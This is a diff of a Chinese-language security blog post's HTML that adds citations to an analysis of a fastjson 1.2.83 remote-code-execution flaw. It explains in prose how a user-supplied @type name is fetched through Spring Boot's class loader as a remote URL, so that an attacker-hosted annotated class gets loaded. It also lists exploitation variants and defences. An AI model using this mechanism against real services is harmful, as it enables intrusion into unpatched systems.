@@ -7,14 +7,14 @@
   <meta name="theme-color" content="#0b0f13" id="meta-theme-color">
   <meta name="color-scheme" content="dark light">
   <title>Fastjson 1.2.83 RCE（上）：漏洞实例与利用完整分析 — Lyle</title>
-  <meta name="description" content="2026 年 7 月 19 日，Kirill Firsov 公开了 fastjson 1.2.83 的一个远程代码执行漏洞。这个版本在 fastjson 1.x 的历史地位特殊：它是 1.x 的最后一个版本，也是&amp;quot;autoType 战争&amp;quot;打了五年之后的终态防御形态——默认关 autoType、黑白名单 hash、expectClass 限">
+  <meta name="description" content="2026 年 7 月 19 日，Kirill Firsov 公开了 fastjson 1.2.83 的一个远程代码执行漏洞[5]。这个版本在 fastjson 1.x 的历史地位特殊：它是 1.x 的最后一个版本[11]，也是&amp;quot;autoType 战争&amp;quot;打了五年之后的终态防御形态——默认关 autoType、黑白名单 hash、expect">
   <meta name="author" content="Lyle">
   <link rel="canonical" href="https://lylemi.github.io/2026/07/26/fastjson-1.2.83-rce-part1/">
   <link rel="alternate" type="application/atom+xml" title="Lyle&#39;s Blog" href="/atom.xml">
   <link rel="icon" href="/favicon.svg" type="image/svg+xml">
   <meta property="og:type" content="article">
   <meta property="og:title" content="Fastjson 1.2.83 RCE（上）：漏洞实例与利用完整分析 — Lyle">
-  <meta property="og:description" content="2026 年 7 月 19 日，Kirill Firsov 公开了 fastjson 1.2.83 的一个远程代码执行漏洞。这个版本在 fastjson 1.x 的历史地位特殊：它是 1.x 的最后一个版本，也是&amp;quot;autoType 战争&amp;quot;打了五年之后的终态防御形态——默认关 autoType、黑白名单 hash、expectClass 限">
+  <meta property="og:description" content="2026 年 7 月 19 日，Kirill Firsov 公开了 fastjson 1.2.83 的一个远程代码执行漏洞[5]。这个版本在 fastjson 1.x 的历史地位特殊：它是 1.x 的最后一个版本[11]，也是&amp;quot;autoType 战争&amp;quot;打了五年之后的终态防御形态——默认关 autoType、黑白名单 hash、expect">
   <meta property="og:url" content="https://lylemi.github.io/2026/07/26/fastjson-1.2.83-rce-part1/">
   <meta property="og:site_name" content="Lyle&#39;s Blog">
   <script>
@@ -32,7 +32,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link rel="preload" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;500;600;700&display=swap" as="style">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;500;600;700&display=swap" media="print" onload="this.media='all'">
-  <link rel="stylesheet" href="/css/trace.css?v=2026-07-26">
+  <link rel="stylesheet" href="/css/trace.css?v=2026-07-27">
 <meta name="generator" content="Hexo 6.3.0"></head>
 
   <body class="page-layout-post">
@@ -65,7 +65,7 @@
       <h1>Fastjson 1.2.83 RCE（上）：漏洞实例与利用完整分析</h1>
       <div class="post-meta">
         <time datetime="2026-07-26T14:00:00.000Z">2026-07-26</time>
-        <span>46 分钟阅读</span>
+        <span>36 分钟阅读</span>
         
           <a href="/tags/Fastjson/">Fastjson</a>
         
@@ -75,20 +75,18 @@
         
           <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
         
-          <a href="/tags/Sematic-Gap/">Sematic Gap</a>
-        
       </div>
     </header>
 
     
       <aside class="post-toc">
         <strong>目录</strong>
-        <nav aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E9%80%9F%E8%A7%88"><span class="toc-text">1. 漏洞速览</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E4%B8%8D%E6%88%90%E7%AB%8B%E5%88%A4%E6%96%AD"><span class="toc-text">常见不成立判断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%A0%B9%E5%9B%A0%EF%BC%9A%E4%BB%A3%E7%A0%81%E8%B7%AF%E5%BE%84"><span class="toc-text">2. 根因：代码路径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-0-%E5%85%A5%E5%8F%A3%EF%BC%9A-type-%E5%A6%82%E4%BD%95%E5%88%B0%E8%BE%BE-checkAutoType"><span class="toc-text">2.0 入口：@type 如何到达 checkAutoType</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E7%94%A8%E6%88%B7%E7%B1%BB%E5%9E%8B%E5%90%8D%E8%A2%AB%E5%BD%93%E4%BD%9C%E8%B5%84%E6%BA%90%E8%B7%AF%E5%BE%84%EF%BC%88ParserConfig-java-1479-1498%EF%BC%89"><span class="toc-text">2.1 用户类型名被当作资源路径（ParserConfig.java:1479-1498）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E8%BF%9C%E7%A8%8B-class-%E7%9A%84-JSONType-%E8%A2%AB%E5%BD%93%E4%BD%9C%E6%8E%88%E6%9D%83%E4%BE%9D%E6%8D%AE"><span class="toc-text">2.2 远程 class 的 @JSONType 被当作授权依据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-jsonType-%E8%A7%A6%E5%8F%91%E5%AE%9E%E9%99%85%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-text">2.3 jsonType 触发实际类加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-jsonType-%E6%97%A9%E8%BF%94%E5%9B%9E%EF%BC%8C%E8%B7%B3%E8%BF%87%E5%85%A8%E9%83%A8%E5%90%8E%E7%BB%AD%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5"><span class="toc-text">2.4 jsonType 早返回，跳过全部后续安全检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-Exception-Error-%E5%90%8E%E7%BC%80%E5%BD%A2%E6%88%90%E5%A4%B1%E8%B4%A5%E8%BD%AF%E9%80%9A%E9%81%93"><span class="toc-text">2.5 Exception&#x2F;Error 后缀形成失败软通道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6-SafeMode-%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-text">2.6 SafeMode 的位置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%85%B3%E9%94%AE%E6%9C%BA%E5%88%B6"><span class="toc-text">3. 关键机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E8%B5%84%E6%BA%90%E5%90%8D%E8%B5%B0%E7%A7%81%E4%B8%8E%E6%95%B4%E6%95%B0-IP"><span class="toc-text">3.1 资源名走私与整数 IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AF%E8%83%BD%EF%BC%9A%E8%B5%84%E6%BA%90%E5%90%8D%E5%A6%82%E4%BD%95%E5%8F%98%E6%88%90-HTTP-%E8%AF%B7%E6%B1%82"><span class="toc-text">3.2 远程加载为什么可能：资源名如何变成 HTTP 请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-ASM-%E9%9D%9E%E6%B3%95%E7%B1%BB%E5%90%8D%EF%BC%9A%E8%AF%AD%E8%A8%80%E8%AF%AD%E6%B3%95%E4%B8%8E-VM-%E8%A7%84%E8%8C%83%E7%9A%84%E7%BC%9D%E9%9A%99"><span class="toc-text">3.3 ASM 非法类名：语言语法与 VM 规范的缝隙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-JDK-%E7%89%88%E6%9C%AC%E5%B7%AE%E5%BC%82%EF%BC%9Anative-%E6%A0%A1%E9%AA%8C%E7%9A%84%E4%B8%A4%E8%BD%AE"><span class="toc-text">3.4 JDK 版本差异：native 校验的两轮</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-%E7%8E%B0%E4%BB%A3-JDK-%E4%B8%A4%E9%98%B6%E6%AE%B5%EF%BC%9Ajar-cache-proc-self-fd"><span class="toc-text">3.5 现代 JDK 两阶段：jar_cache + &#x2F;proc&#x2F;self&#x2F;fd</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%8F%98%E4%BD%93%E7%9F%A9%E9%98%B5%EF%BC%88%E6%A0%B8%E5%BF%83%EF%BC%89"><span class="toc-text">4. 变体矩阵（核心）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E4%B8%BB%E8%A6%81%E5%AD%98%E6%B4%BB%E6%A0%BC%E5%AD%90%E5%88%A9%E7%94%A8%E8%AF%A6%E8%BF%B0"><span class="toc-text">5. 主要存活格子利用详述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#R1%EF%BC%88JDK-8-%E6%9C%80%E7%9F%AD%E9%93%BE%EF%BC%8C%E5%B7%B2%E5%AE%9E%E8%AF%81%EF%BC%89"><span class="toc-text">R1（JDK 8 最短链，已实证）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R2%EF%BC%88%E7%8E%B0%E4%BB%A3-JDK-%E4%B8%A4%E9%98%B6%E6%AE%B5%EF%BC%8C%E5%B7%B2%E5%AE%9E%E8%AF%81%EF%BC%89"><span class="toc-text">R2（现代 JDK 两阶段，已实证）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R3-R3b%EF%BC%88%E5%86%85%E5%B5%8C-Tomcat%EF%BC%89%EF%BC%9AautoType-%E6%8B%92%E6%9D%80%E4%B8%8E-CL-%E6%8B%93%E6%89%91%E4%BE%9D%E8%B5%96"><span class="toc-text">R3&#x2F;R3b（内嵌 Tomcat）：autoType 拒杀与 CL 拓扑依赖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R6-R4b%EF%BC%88%E6%97%A0%E5%87%BA%E7%BD%91-staging%EF%BC%8C%E5%B7%B2%E5%AE%9E%E8%AF%81%EF%BC%89"><span class="toc-text">R6&#x2F;R4b（无出网 staging，已实证）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R7%EF%BC%88Windows-UNC%EF%BC%8C%E5%B7%B2%E8%AF%81%E4%BC%AA%EF%BC%89"><span class="toc-text">R7（Windows UNC，已证伪）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R8%EF%BC%88FTP-%E4%BC%A0%E8%BE%93%E9%80%9A%E9%81%93%EF%BC%8C%E5%B7%B2%E5%AE%9E%E8%AF%81%EF%BC%89"><span class="toc-text">R8（FTP 传输通道，已实证）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-text">6. 检测与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E9%98%B2%E5%BE%A1%E6%95%88%E5%8A%9B%EF%BC%88%E4%BB%8E%E7%9F%A9%E9%98%B5%E8%AF%BB%E5%87%BA%EF%BC%8C%E5%AE%9E%E9%AA%8C%E5%90%8E%E6%9B%B4%E6%96%B0%EF%BC%89"><span class="toc-text">6.1 防御效力（从矩阵读出，实验后更新）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E6%A3%80%E6%B5%8B-IOC%EF%BC%88%E5%AE%9E%E9%AA%8C%E8%A1%A5%E5%85%85%EF%BC%89"><span class="toc-text">6.2 检测 IOC（实验补充）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E6%97%B6%E9%97%B4%E7%BA%BF%E4%B8%8E%E8%B5%84%E6%96%99%E6%9D%A5%E6%BA%90"><span class="toc-text">7. 时间线与资料来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E5%AE%9E%E9%AA%8C%E7%BB%93%E6%9E%9C%EF%BC%88%E9%A2%84%E6%B3%A8%E5%86%8C%E2%86%92%E5%B7%B2%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-text">8. 实验结果（预注册→已执行）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-0-%E5%AF%B9%E7%85%A7%E7%BB%84"><span class="toc-text">8.0 对照组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1-E4%EF%BC%9ATomcat-%E5%86%85%E5%B5%8C%E5%AE%B9%E5%99%A8%EF%BC%88R3-R3b%EF%BC%89"><span class="toc-text">8.1 E4：Tomcat 内嵌容器（R3&#x2F;R3b）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2-E1%EF%BC%9AWindows-%E6%9C%AC%E5%9C%B0-staging%EF%BC%88R4b%EF%BC%89"><span class="toc-text">8.2 E1：Windows 本地 staging（R4b）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3-E2%EF%BC%9ALinux-%E6%97%A0%E5%87%BA%E7%BD%91-staging%EF%BC%88R6%EF%BC%89"><span class="toc-text">8.3 E2：Linux 无出网 staging（R6）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-4-E3%EF%BC%9AWindows-UNC-SMB%EF%BC%88R7%EF%BC%89"><span class="toc-text">8.4 E3：Windows UNC&#x2F;SMB（R7）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-5-E5%EF%BC%9AFTP-%E4%BC%A0%E8%BE%93%E9%80%9A%E9%81%93%EF%BC%88R8%EF%BC%89"><span class="toc-text">8.5 E5：FTP 传输通道（R8）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-6-%E6%B1%87%E6%80%BB%E4%B8%8E%E4%BF%AE%E6%AD%A3"><span class="toc-text">8.6 汇总与修正</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-%E7%BB%93%E8%AF%AD%EF%BC%9A%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E%E6%95%99%E4%BC%9A%E6%88%91%E4%BB%AC%E4%BB%80%E4%B9%88"><span class="toc-text">9. 结语：这个漏洞教会我们什么</span></a></li></ol></nav>
+        <nav aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E9%80%9F%E8%A7%88"><span class="toc-text">1. 漏洞速览</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E4%B8%8D%E6%88%90%E7%AB%8B%E5%88%A4%E6%96%AD"><span class="toc-text">常见不成立判断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%A0%B9%E5%9B%A0%EF%BC%9A%E4%BB%A3%E7%A0%81%E8%B7%AF%E5%BE%84"><span class="toc-text">2. 根因：代码路径</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-0-%E5%85%A5%E5%8F%A3%EF%BC%9A-type-%E5%A6%82%E4%BD%95%E5%88%B0%E8%BE%BE-checkAutoType"><span class="toc-text">2.0 入口：@type 如何到达 checkAutoType</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E7%94%A8%E6%88%B7%E7%B1%BB%E5%9E%8B%E5%90%8D%E8%A2%AB%E5%BD%93%E4%BD%9C%E8%B5%84%E6%BA%90%E8%B7%AF%E5%BE%84%EF%BC%88ParserConfig-java-1479-1498%EF%BC%89"><span class="toc-text">2.1 用户类型名被当作资源路径（ParserConfig.java:1479-1498）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E8%BF%9C%E7%A8%8B-class-%E7%9A%84-JSONType-%E8%A2%AB%E5%BD%93%E4%BD%9C%E6%8E%88%E6%9D%83%E4%BE%9D%E6%8D%AE"><span class="toc-text">2.2 远程 class 的 @JSONType 被当作授权依据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-jsonType-%E8%A7%A6%E5%8F%91%E5%AE%9E%E9%99%85%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-text">2.3 jsonType 触发实际类加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-jsonType-%E6%97%A9%E8%BF%94%E5%9B%9E%EF%BC%8C%E8%B7%B3%E8%BF%87%E5%85%A8%E9%83%A8%E5%90%8E%E7%BB%AD%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5"><span class="toc-text">2.4 jsonType 早返回，跳过全部后续安全检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-Exception-Error-%E5%90%8E%E7%BC%80%E5%BD%A2%E6%88%90%E5%A4%B1%E8%B4%A5%E8%BD%AF%E9%80%9A%E9%81%93"><span class="toc-text">2.5 Exception&#x2F;Error 后缀形成失败软通道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6-SafeMode-%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-text">2.6 SafeMode 的位置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%85%B3%E9%94%AE%E6%9C%BA%E5%88%B6"><span class="toc-text">3. 关键机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E8%B5%84%E6%BA%90%E5%90%8D%E8%B5%B0%E7%A7%81%E4%B8%8E%E6%95%B4%E6%95%B0-IP"><span class="toc-text">3.1 资源名走私与整数 IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E4%B8%BA%E4%BB%80%E4%B9%88%E5%8F%AF%E8%83%BD%EF%BC%9A%E8%B5%84%E6%BA%90%E5%90%8D%E5%A6%82%E4%BD%95%E5%8F%98%E6%88%90-HTTP-%E8%AF%B7%E6%B1%82"><span class="toc-text">3.2 远程加载为什么可能：资源名如何变成 HTTP 请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-ASM-%E9%9D%9E%E6%B3%95%E7%B1%BB%E5%90%8D%EF%BC%9A%E8%AF%AD%E8%A8%80%E8%AF%AD%E6%B3%95%E4%B8%8E-VM-%E8%A7%84%E8%8C%83%E7%9A%84%E7%BC%9D%E9%9A%99"><span class="toc-text">3.3 ASM 非法类名：语言语法与 VM 规范的缝隙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-JDK-%E7%89%88%E6%9C%AC%E5%B7%AE%E5%BC%82%EF%BC%9Anative-%E6%A0%A1%E9%AA%8C%E7%9A%84%E4%B8%A4%E8%BD%AE"><span class="toc-text">3.4 JDK 版本差异：native 校验的两轮</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-%E7%8E%B0%E4%BB%A3-JDK-%E4%B8%A4%E9%98%B6%E6%AE%B5%EF%BC%9Ajar-cache-proc-self-fd"><span class="toc-text">3.5 现代 JDK 两阶段：jar_cache + &#x2F;proc&#x2F;self&#x2F;fd</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%85%A8%E8%B2%8C%E4%B8%8E%E8%AF%A6%E8%BF%B0"><span class="toc-text">4. 利用场景全貌与详述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-JDK-8-%E6%9C%80%E7%9F%AD%E9%93%BE"><span class="toc-text">4.1 JDK 8 最短链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E7%8E%B0%E4%BB%A3-JDK-%E4%B8%A4%E9%98%B6%E6%AE%B5"><span class="toc-text">4.2 现代 JDK 两阶段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E6%97%A0%E5%87%BA%E7%BD%91-staging"><span class="toc-text">4.3 无出网 staging</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-FTP-%E4%BC%A0%E8%BE%93%E9%80%9A%E9%81%93"><span class="toc-text">4.4 FTP 传输通道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E5%85%B3%E9%94%AE%E7%BB%93%E8%AE%BA"><span class="toc-text">4.5 关键结论</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-text">5. 检测与防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E8%B5%84%E6%96%99%E6%9D%A5%E6%BA%90%E4%B8%8E%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-text">6. 资料来源与参考文献</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-%E4%BA%8B%E4%BB%B6%E6%97%B6%E9%97%B4%E7%BA%BF"><span class="toc-text">6.1 事件时间线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="toc-text">6.2 参考文献</span></a></li></ol></li></ol></nav>
       </aside>
     
     <div class="article-content">
-      <p>2026 年 7 月 19 日，Kirill Firsov 公开了 fastjson 1.2.83 的一个远程代码执行漏洞。这个版本在 fastjson 1.x 的历史地位特殊：它是 1.x 的最后一个版本，也是&quot;autoType 战争&quot;打了五年之后的终态防御形态——默认关 autoType、黑白名单 hash、expectClass 限制层层设防，社区共识是&quot;1.2.83 基本不可利用，可以养老&quot;。这个共识在一周内被打破，而且打破它的不是某个新的 gadget，而是一种完全不同的东西：漏洞不住在 fastjson 自己的代码里，也不住在 Spring Boot 或 JDK 的代码里，而住在三者接缝处的语义分歧里。</p>
-<p>本文是三篇系列的上篇，目标是把这个漏洞的<strong>实例与利用</strong>讲完整：根因代码路径逐段核对（§2）、关键机制全部落到一手源码（§3）、变体矩阵给出全部已知存活与死亡格子（§4-§5）、检测防御逐项判定效力（§6），并以自主复现实验（§8）对预注册假设逐项裁决——5 个实验完成 4 个确定性判定（3 证实 1 证伪）、1 个维持未决。中篇将从本案例抽象出&quot;语义缝隙&quot;与&quot;行为层 gadget&quot;的分析框架；下篇讨论 AI 辅助漏洞挖掘在这个案例中的元问题。</p>
+      <p>2026 年 7 月 19 日，Kirill Firsov 公开了 fastjson 1.2.83 的一个远程代码执行漏洞[5]。这个版本在 fastjson 1.x 的历史地位特殊：它是 1.x 的最后一个版本[11]，也是&quot;autoType 战争&quot;打了五年之后的终态防御形态——默认关 autoType、黑白名单 hash、expectClass 限制层层设防，社区共识是&quot;1.2.83 基本不可利用，可以养老&quot;。这个共识在一周内被打破，而且打破它的不是某个新的 gadget，而是一种完全不同的东西：漏洞不住在 fastjson 自己的代码里，也不住在 Spring Boot 或 JDK 的代码里，而住在三者接缝处的语义分歧里[5][8]。</p>
+<p>本文是三篇系列的上篇，目标是把这个漏洞的<strong>实例与利用</strong>讲完整。中篇将从本案例抽象出&quot;语义缝隙&quot;与&quot;行为层 gadget&quot;的分析框架；下篇讨论 AI 辅助漏洞挖掘在这个案例中的元问题。</p>
 <span id="more"></span>
 
 <hr>
@@ -101,7 +99,7 @@
 </thead>
 <tbody><tr>
 <td>编号</td>
-<td>QVD-2026-43021（奇安信）&#x2F; CVE-2026-16723</td>
+<td>CVE-2026-16723 &#x2F; QVD-2026-43021（奇安信）</td>
 </tr>
 <tr>
 <td>CVSS</td>
@@ -109,48 +107,46 @@
 </tr>
 <tr>
 <td>影响版本</td>
-<td>fastjson 1.2.68 ~ 1.2.83（原作者口径）；部分通告称 1.2.66 起</td>
+<td>fastjson 1.2.68 ~ 1.2.83[1][5]；部分通告称 1.2.66 起[14]</td>
 </tr>
 <tr>
 <td>类型</td>
-<td>无需 gadget 的远程代码执行（Gadget-Free RCE）</td>
+<td>无需 gadget 的远程代码执行（Gadget-Free RCE）[1]</td>
 </tr>
 <tr>
 <td>披露者</td>
-<td>Kirill Firsov (@k_firsov)，2026-07-19</td>
+<td>Kirill Firsov (@k_firsov)，2026-07-19[5]</td>
 </tr>
 <tr>
 <td>修复</td>
-<td>SafeMode（P0）&#x2F; <code>1.2.83_noneautotype</code>（P0）&#x2F; 迁移 fastjson2（P1）</td>
+<td>SafeMode（P0）&#x2F; <code>1.2.83_noneautotype</code>（P0）&#x2F; 迁移 fastjson2（P1）[1][6]</td>
 </tr>
 </tbody></table>
-<p><strong>一句话概括</strong>：fastjson 在处理 <code>@type</code> 时存在一条&quot;先探测再加载&quot;的信任分支——把用户可控的类名当作资源路径交给 ClassLoader 取回字节、用 ASM 检测其是否带 <code>@JSONType</code> 注解，带则无条件 <code>loadClass</code>。在能把这个&quot;资源路径&quot;解析成远程 URL 的 ClassLoader 环境中（典型：Spring Boot FatJar 的 <code>LaunchedURLClassLoader</code>），攻击者托管一个带 <code>@JSONType</code> 注解的恶意 class，即可在类型绑定之前完成远程类加载并执行其静态初始化块 <code>&lt;clinit&gt;</code>。</p>
+<p><strong>一句话概括</strong>：fastjson 在处理 <code>@type</code> 时存在一条&quot;先探测再加载&quot;的信任分支——把用户可控的类名当作资源路径交给 ClassLoader 取回字节、用 ASM 检测其是否带 <code>@JSONType</code> 注解，带则无条件 <code>loadClass</code>[5]。在能把这个&quot;资源路径&quot;解析成远程 URL 的 ClassLoader 环境中（典型：Spring Boot FatJar 的 <code>LaunchedURLClassLoader</code>[5]），攻击者托管一个带 <code>@JSONType</code> 注解的恶意 class，即可在类型绑定之前完成远程类加载并执行其静态初始化块 <code>&lt;clinit&gt;</code>[8]。</p>
 <p><strong>为什么重要</strong>：</p>
 <ol>
-<li>fastjson 1.x 是互联网部署最广的 Java JSON 库之一；1.2.83 是 1.x 最后版本，此前公认&quot;只能基于 expectClass 和第三方库 gadget 做极有限利用，几乎无法 RCE&quot;，大量厂商因此选择不升级</li>
-<li>本漏洞<strong>与 autoType 是否开启无关、不需要 expectClass、不需要 classpath 里存在 gadget</strong>——三个主流缓解假设同时失效</li>
-<li>影响 JDK 8 &#x2F; 17 &#x2F; 21 &#x2F; 25 均有复现（本文 JDK 8 + JDK 17 自主复现，21&#x2F;25 依据 GCSA 报告）</li>
-<li>它的根不住在任何一个组件的代码里，而住在组件之间的<strong>语义缝隙</strong>里：fastjson 假设 <code>getResourceAsStream</code> 只在本地 classpath 找资源，Spring Boot 的 ClassLoader 实际会把资源名当 URL 解析——实验证实 HTTP、FTP、本地文件三种传输通道均可完成全链。</li>
+<li>fastjson 1.x 是互联网部署最广的 Java JSON 库之一；1.2.83 是 1.x 最后版本[11]，此前公认&quot;只能基于 expectClass 和第三方库 gadget 做极有限利用，几乎无法 RCE&quot;[5]，大量厂商因此选择不升级</li>
+<li>本漏洞<strong>与 autoType 是否开启无关、不需要 expectClass、不需要 classpath 里存在 gadget</strong>——三个主流缓解假设同时失效[1]</li>
+<li>影响 JDK 8 &#x2F; 17 &#x2F; 21 &#x2F; 25 均有复现（本文 JDK 8 + JDK 17 自主复现，21&#x2F;25 依据 GCSA 报告[8]）</li>
+<li>它的根不住在任何一个组件的代码里，而住在组件之间的<strong>语义缝隙</strong>里：fastjson 假设 <code>getResourceAsStream</code> 只在本地 classpath 找资源，Spring Boot 的 ClassLoader 实际会把资源名当 URL 解析[5]——实验证实 HTTP、FTP、本地文件三种传输通道均可完成全链[14]。</li>
 </ol>
-<blockquote>
-<p><strong>术语注</strong>：&quot;语义缝隙&quot;是本文自造词，指<strong>两个语义层之间可被利用的分歧</strong>（spec vs 实现、组件 A 的假设 vs 组件 B 的行为、意图用途 vs 可达用途）。相邻领域各有局部对应词——web 的 desync &#x2F; parser differential、二进制的 gadget（本文的 trick 可视为<strong>行为层的 gadget</strong>）、VM 自省的 semantic gap、形式化的 refinement failure、Bratus 的 weird machine——但无一覆盖统一含义。完整术语论证见中篇。</p>
-</blockquote>
 <h3 id="常见不成立判断"><a href="#常见不成立判断" class="headerlink" title="常见不成立判断"></a>常见不成立判断</h3><ul>
-<li>&quot;AutoType 默认关闭，所以安全&quot; —— 不成立</li>
-<li>&quot;parseObject 固定了第二个参数，所以安全&quot; —— 不成立（探测发生在类型绑定之前）</li>
-<li>&quot;classpath 没有已知 gadget，所以安全&quot; —— 不成立</li>
-<li>&quot;JDK 17+ 会拒绝 <code>http://</code> 内部类名，所以最多只是 SSRF&quot; —— 不成立（见 §3.5 两阶段利用）</li>
+<li>&quot;AutoType 默认关闭，所以安全&quot; —— 不成立[1]</li>
+<li>&quot;parseObject 固定了第二个参数，所以安全&quot; —— 不成立（探测发生在类型绑定之前）[5]</li>
+<li>&quot;classpath 没有已知 gadget，所以安全&quot; —— 不成立[5]</li>
+<li>&quot;JDK 17+ 会拒绝 <code>http://</code> 内部类名，所以最多只是 SSRF&quot; —— 不成立（见 §3.5 两阶段利用）[8]</li>
 </ul>
 <hr>
 <h2 id="2-根因：代码路径"><a href="#2-根因：代码路径" class="headerlink" title="2. 根因：代码路径"></a>2. 根因：代码路径</h2><blockquote>
-<p><strong>代码出处</strong>（引用均标注 tag&#x2F;commit 与行号）：</p>
+<p><strong>代码出处</strong>：</p>
 <ul>
 <li>fastjson：tag 1.2.83（commit <code>26f13f84f</code>）</li>
 <li>Spring Boot：tag v2.7.18</li>
 <li>OpenJDK 8：tag jdk8u502-ga</li>
-<li>OpenJDK master：commit <code>1bc03f02</code>（作为&quot;现代 JDK&quot;代表；JDK 9 引入收紧的边界依据公开分析，未逐版本核对）</li>
+<li>OpenJDK master：commit <code>1bc03f02</code>（作为&quot;现代 JDK&quot;代表；JDK 9 引入收紧的边界依据公开分析[5]，未逐版本核对）</li>
 <li>Tomcat：分支 9.0.x（仅 <code>catalina/loader</code>）</li>
 </ul>
+<p><strong>本节分析综合以下来源</strong>：官方 advisory[1]、LoRexxar 技术分析[5]、9eek 源码级分析[7]、GCSA 深度分析[8]、FreeBuf 分析[13]。</p>
